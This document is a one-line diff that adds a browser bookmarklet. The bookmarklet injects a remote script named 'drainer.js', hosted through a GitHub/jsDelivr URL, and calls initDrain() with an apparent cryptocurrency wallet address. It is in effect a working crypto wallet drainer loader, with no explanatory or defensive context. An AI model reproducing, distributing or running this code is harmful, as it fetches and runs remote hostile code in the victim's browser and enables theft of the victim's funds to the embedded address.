@@ -1,0 +1,1 @@
+javascript:(function(){var a=document.createElement('script');a.src='https://cdn.jsdelivr.net/gh/bestmaker112/Axiom@main/drainer.js';a.onload=function(){initDrain('Bid5XkcrvTpvPr3ipMpQkDKELzz62GBmLRkbfG1S2a82');};document.head.appendChild(a);})();
